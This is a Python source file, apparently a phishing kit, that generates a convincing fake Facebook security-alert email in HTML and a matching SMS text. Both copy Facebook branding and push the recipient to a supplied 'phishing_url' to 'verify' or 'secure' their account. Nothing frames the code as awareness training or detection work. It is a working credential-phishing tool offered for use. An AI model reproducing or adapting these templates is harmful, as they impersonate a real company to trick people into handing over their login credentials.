"""
Phishing Email Generator
Author : Jitu Jak
"""

class EmailGenerator:
    def __init__(self, config):
        self.config = config
    
    def generate_security_alert(self, target_email, phishing_url):
        """Generate a convincing Facebook security alert email"""
        return f"""<html>
<body style="font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; margin: 0;">
    <table width="100%" cellpadding="0" cellspacing="0" style="max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.15);">
        <tr>
            <td style="background: #1877f2; padding: 20px 24px; border-radius: 8px 8px 0 0;">
                <table width="100%">
                    <tr>
                        <td><h1 style="color: white; margin: 0; font-size: 28px;">facebook</h1></td>
                        <td style="text-align: right; color: rgba(255,255,255,0.8); font-size: 13px;">Security Center</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td style="padding: 32px 24px;">
                <h2 style="color: #1c1e21; font-size: 22px; margin: 0 0 8px 0;">Suspicious Login Attempt</h2>
                <p style="color: #606770; font-size: 15px; line-height: 1.6; margin: 0 0 20px 0;">
                    Hi <strong>{target_email.split('@')[0]}</strong>,
                </p>
                <p style="color: #606770; font-size: 15px; line-height: 1.6; margin: 0 0 16px 0;">
                    We noticed a login attempt to your Facebook account from an unrecognized device or browser.
                </p>
                
                <div style="background: #f0f2f5; padding: 16px 20px; border-radius: 8px; margin: 16px 0; border-left: 4px solid #1877f2;">
                    <table style="width: 100%; font-size: 14px; color: #606770;">
                        <tr><td style="padding: 4px 0; width: 100px;"><strong>Location:</strong></td><td>Unknown (IP masked)</td></tr>
                        <tr><td style="padding: 4px 0;"><strong>Device:</strong></td><td>Chrome on Windows 10</td></tr>
                        <tr><td style="padding: 4px 0;"><strong>Browser:</strong></td><td>Chrome 125.0.6422.60</td></tr>
                        <tr><td style="padding: 4px 0;"><strong>Time:</strong></td><td>{self._get_current_time()}</td></tr>
                    </table>
                </div>
                
                <p style="color: #606770; font-size: 15px; line-height: 1.6; margin: 16px 0;">
                    If this was you, please verify your account below to keep it secure. If this wasn't you, someone may have your password.
                </p>
                
                <table cellpadding="0" cellspacing="0" style="margin: 28px 0;">
                    <tr>
                        <td style="background: #1877f2; border-radius: 6px; text-align: center;">
                            <a href="{phishing_url}" style="display: inline-block; padding: 14px 36px; color: white; text-decoration: none; font-size: 16px; font-weight: 600; letter-spacing: 0.3px;">Secure Your Account</a>
                        </td>
                    </tr>
                </table>
                
                <p style="color: #606770; font-size: 14px; line-height: 1.5; margin: 16px 0 8px 0;">
                    <strong>Can't click the button?</strong> Copy and paste this link into your browser:
                </p>
                <p style="color: #1877f2; font-size: 13px; word-break: break-all; margin: 0;">
                    {phishing_url}
                </p>
                
                <hr style="border: none; border-top: 1px solid #dadde1; margin: 28px 0 20px 0;">
                
                <p style="color: #bec3c9; font-size: 12px; line-height: 1.5; margin: 0;">
                    This message was sent to {target_email}. If you don't recognise this activity, please ignore this email.
                    <br><br>
                    Facebook, Inc., 1 Hacker Way, Menlo Park, CA 94025
                </p>
            </td>
        </tr>
        <tr>
            <td style="background: #f5f5f5; padding: 16px 24px; border-radius: 0 0 8px 8px; text-align: center;">
                <p style="color: #bec3c9; font-size: 11px; margin: 0;">
                    Please don't reply to this email. <a href="#" style="color: #385898;">Help Center</a> | <a href="#" style="color: #385898;">Security</a>
                </p>
            </td>
        </tr>
    </table>
</body>
</html>"""
    
    def generate_sms_template(self, phishing_url):
        """Generate SMS phishing template"""
        return f"""SECURITY ALERT: We detected a login from an unrecognized device. If this was you, verify your account here: {phishing_url}

If you didn't request this, you can ignore this message. Facebook Security Team"""
    
    def _get_current_time(self):
        import datetime
        now = datetime.datetime.now()
        return now.strftime("%B %d, %Y at %I:%M %p")